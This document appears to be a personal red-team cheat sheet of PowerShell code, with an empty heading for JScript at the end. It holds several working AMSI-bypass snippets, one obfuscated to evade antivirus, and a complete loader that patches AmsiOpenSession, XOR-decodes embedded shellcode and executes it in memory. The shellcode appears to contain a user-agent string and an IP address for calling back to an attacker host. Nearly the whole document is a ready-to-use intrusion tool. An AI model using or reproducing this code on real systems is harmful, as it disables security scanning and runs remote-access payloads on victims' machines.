# Powershell 
<br>

### Disables AMSI by attacking initialization 
<br>

``` powershell

$loc = 'System.Management.Automation.AmsiUtils'
$field = 'amsiInitFailed'
$GT = [Ref].Assembly.GetType($loc).GetField($field,'NonPublic,Static')
$GT.SetValue($null,$true)

```
<br>

### Disable AMSI by attacking AmsiContext and rewrite first 4 bytes to 0000  
<br>

``` powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like ("*i" + "Utils")) {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

```
<br><br>

**Above is flagged by AV.  This is not but this also doesnt block anything AMSI for me....**

``` powershell
$find = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("KgBpAFUAdABpAGwAcwA=")); $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like $find) {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

### Disable AMSI by patching internals (This attack only seems to work for me when pasting into powershell.  Not loading a ps1 file 

**After performing this attack make sure to reset the memory back to its old read/execute permissions**

``` powershell

$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)

```
<Br><br>

``` powershell


function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('Xyxtem.dll'.Replace('X','S').Replace('x','s')) }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

function x0r {

    param (
        $buf,
        $xorKey
    )
    [Byte[]] $xorBuf = @()
    for ($i = 0; $i -lt $buf.Length; $i++) {
    $xorByte = $buf[$i] -bxor $xorKey
    $xorBuf += [Byte]$xorByte
    }


 return $xorBuf

}


[IntPtr]$funcddr = LookupFunc amsi.dll AmsiOpenSession
$oldBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcddr, 3, 0x40, [ref]$oldBuffer)

$3buf = [Byte[]] (0x48, 0x31, 0xC0) 


[System.Runtime.InteropServices.Marshal]::Copy($3buf, 0, $funcddr, 3)


[Byte[]] $buf = 0x06,0xb2,0x79,0x1e,0x0a,0x12,0x36,0xfa,0xfa,0xfa,0xbb,0xab,0xbb,0xaa,0xa8,0xb2,0xcb,0x28,0xab,0x9f,0xb2,0x71,0xa8,0x9a,0xac,0xb2,0x71,0xa8,0xe2,0xb2,0x71,0xa8,0xda,0xb7,0xcb,0x33,0xb2,0xf5,0x4d,0xb0,0xb0,0xb2,0x71,0x88,0xaa,0xb2,0xcb,0x3a,0x56,0xc6,0x9b,0x86,0xf8,0xd6,0xda,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0x18,0x17,0xa8,0xbb,0xab,0xb2,0x71,0xa8,0xda,0x71,0xb8,0xc6,0xb2,0xfb,0x2a,0x9c,0x7b,0x82,0xe2,0xf1,0xf8,0xf5,0x7f,0x88,0xfa,0xfa,0xfa,0x71,0x7a,0x72,0xfa,0xfa,0xfa,0xb2,0x7f,0x3a,0x8e,0x9d,0xb2,0xfb,0x2a,0xaa,0xbe,0x71,0xba,0xda,0x71,0xb2,0xe2,0xb3,0xfb,0x2a,0x19,0xac,0xb2,0x05,0x33,0xb7,0xcb,0x33,0xbb,0x71,0xce,0x72,0xb2,0xfb,0x2c,0xb2,0xcb,0x3a,0xbb,0x3b,0x33,0xf7,0x56,0xbb,0xfb,0x3b,0xc2,0x1a,0x8f,0x0b,0xb6,0xf9,0xb6,0xde,0xf2,0xbf,0xc3,0x2b,0x8f,0x22,0xa2,0xbe,0x71,0xba,0xde,0xb3,0xfb,0x2a,0x9c,0xbb,0x71,0xf6,0xb2,0xbe,0x71,0xba,0xe6,0xb3,0xfb,0x2a,0xbb,0x71,0xfe,0x72,0xb2,0xfb,0x2a,0xbb,0xa2,0xbb,0xa2,0xa4,0xa3,0xa0,0xbb,0xa2,0xbb,0xa3,0xbb,0xa0,0xb2,0x79,0x16,0xda,0xbb,0xa8,0x05,0x1a,0xa2,0xbb,0xa3,0xa0,0xb2,0x71,0xe8,0x13,0xb1,0x05,0x05,0x05,0xa7,0xb2,0xcb,0x21,0xa9,0xb3,0x44,0x8d,0x93,0x94,0x93,0x94,0x9f,0x8e,0xfa,0xbb,0xac,0xb2,0x73,0x1b,0xb3,0x3d,0x38,0xb6,0x8d,0xdc,0xfd,0x05,0x2f,0xa9,0xa9,0x12,0x57,0xfa,0xfa,0xfa,0xb7,0x95,0x80,0x93,0x96,0x96,0x9b,0xd5,0xcf,0xd4,0xca,0xda,0xd2,0xda,0x93,0xaa,0x92,0x95,0x94,0x9f,0xc1,0xda,0xb9,0xaa,0xaf,0xda,0xda,0x93,0xaa,0x92,0x95,0x94,0x9f,0xda,0xb5,0xa9,0xda,0xcb,0xc2,0xa5,0xcc,0xa5,0xc8,0xda,0x96,0x93,0x91,0x9f,0xda,0xb7,0x9b,0x99,0xda,0xb5,0xa9,0xda,0xa2,0xd3,0xda,0xbb,0x8a,0x8a,0x96,0x9f,0xad,0x9f,0x98,0xb1,0x93,0x8e,0xd5,0xcc,0xca,0xcf,0xd4,0xcb,0xd4,0xcb,0xcf,0xda,0xd2,0xb1,0xb2,0xae,0xb7,0xb6,0xd6,0xda,0x96,0x93,0x91,0x9f,0xda,0xbd,0x9f,0x99,0x91,0x95,0xd3,0xda,0xac,0x9f,0x88,0x89,0x93,0x95,0x94,0xd5,0xcb,0xc2,0xd4,0xcc,0xd4,0xc8,0xda,0xb7,0x95,0x98,0x93,0x96,0x9f,0xd5,0xcb,0xcf,0xbf,0xcb,0xce,0xc2,0xda,0xa9,0x9b,0x9c,0x9b,0x88,0x93,0xd5,0xcc,0xca,0xcf,0xd4,0xcb,0xd4,0xcb,0xcf,0xda,0xb8,0x93,0x94,0x9d,0xa9,0x9b,0x8a,0x8a,0x92,0x93,0x88,0x9f,0xd5,0xc9,0xcb,0xd4,0xce,0xd4,0xce,0xc9,0xca,0xce,0xc9,0xca,0xca,0xca,0xcb,0xfa,0xa3,0xa9,0xa0,0xb7,0xcb,0x3a,0xb7,0xcb,0x33,0xa9,0xa9,0xb3,0x40,0xc0,0xac,0x83,0x5d,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0x12,0xf4,0xfa,0xfa,0xfa,0xcb,0xc3,0xc8,0xd4,0xcb,0xcc,0xc2,0xd4,0xcb,0xd4,0xcb,0xc3,0xcc,0xfa,0xa0,0xb2,0x73,0x3b,0xb3,0x3d,0x3a,0x91,0xdb,0xfa,0xfa,0xb7,0xcb,0x33,0xa9,0xa9,0x90,0xf9,0xa9,0xb3,0x40,0xad,0x73,0x65,0x3c,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0x12,0x8b,0xfa,0xfa,0xfa,0xd5,0xcc,0x92,0x8b,0xcd,0xbb,0x9e,0xb4,0xb8,0x89,0x82,0x80,0xcd,0xb9,0x8c,0x95,0xb3,0x91,0xcd,0xae,0xbf,0x89,0x9d,0xcc,0xae,0x8b,0xb2,0x8c,0xb5,0xaa,0xab,0xad,0x8d,0x9c,0xd7,0x8c,0xb0,0x8b,0xb5,0xbe,0x90,0xd7,0x97,0xbb,0x8e,0xa3,0x93,0xbc,0xaf,0x9b,0xb6,0xa8,0xcd,0xc2,0xa0,0x8d,0xaa,0xb0,0xbc,0xbd,0x98,0xb2,0x97,0xc2,0xb3,0x9d,0x8d,0xce,0x9f,0x8c,0xb8,0xb4,0xbe,0x9c,0x90,0x8e,0xa9,0xae,0xa0,0xbf,0xc3,0xb6,0x91,0x88,0xa3,0xb2,0xbe,0x8a,0x95,0x9b,0xb3,0x98,0x95,0xac,0xc2,0x91,0xad,0xbe,0xb3,0xaa,0xc3,0xcc,0x8e,0x95,0x98,0xa3,0xb9,0xb8,0xa3,0xb2,0xc3,0xa2,0xfa,0xb2,0x73,0x3b,0xa9,0xa0,0xbb,0xa2,0xb7,0xcb,0x33,0xa9,0xb2,0x42,0xfa,0xc8,0x52,0x7e,0xfa,0xfa,0xfa,0xfa,0xaa,0xa9,0xa9,0xb3,0x3d,0x38,0x11,0xaf,0xd4,0xc1,0x05,0x2f,0xb2,0x73,0x3c,0x90,0xf0,0xa5,0xb2,0x73,0x0b,0x90,0xe5,0xa0,0xa8,0x92,0x7a,0xc9,0xfa,0xfa,0xb3,0x73,0x1a,0x90,0xfe,0xbb,0xa3,0xb3,0x40,0x8f,0xbc,0x64,0x7c,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0xb7,0xcb,0x3a,0xa9,0xa0,0xb2,0x73,0x0b,0xb7,0xcb,0x33,0xb7,0xcb,0x33,0xa9,0xa9,0xb3,0x3d,0x38,0xd7,0xfc,0xe2,0x81,0x05,0x2f,0x7f,0x3a,0x8f,0xe5,0xb2,0x3d,0x3b,0x72,0xe9,0xfa,0xfa,0xb3,0x40,0xbe,0x0a,0xcf,0x1a,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0xb2,0x05,0x35,0x8e,0xf8,0x11,0x50,0x12,0xaf,0xfa,0xfa,0xfa,0xa9,0xa3,0x90,0xba,0xa0,0xb3,0x73,0x2b,0x3b,0x18,0xea,0xb3,0x3d,0x3a,0xfa,0xea,0xfa,0xfa,0xb3,0x40,0xa2,0x5e,0xa9,0x1f,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0xb2,0x69,0xa9,0xa9,0xb2,0x73,0x1d,0xb2,0x73,0x0b,0xb2,0x73,0x20,0xb3,0x3d,0x3a,0xfa,0xda,0xfa,0xfa,0xb3,0x73,0x03,0xb3,0x40,0xe8,0x6c,0x73,0x18,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0xb2,0x79,0x3e,0xda,0x7f,0x3a,0x8e,0x48,0x9c,0x71,0xfd,0xb2,0xfb,0x39,0x7f,0x3a,0x8f,0x28,0xa2,0x39,0xa2,0x90,0xfa,0xa3,0xb3,0x3d,0x38,0x0a,0x4f,0x58,0xac,0x05,0x2f

$meow = x0r -buf $buf -xorKey 0xFA

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($meow ,0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)

```


# JSCRIPT
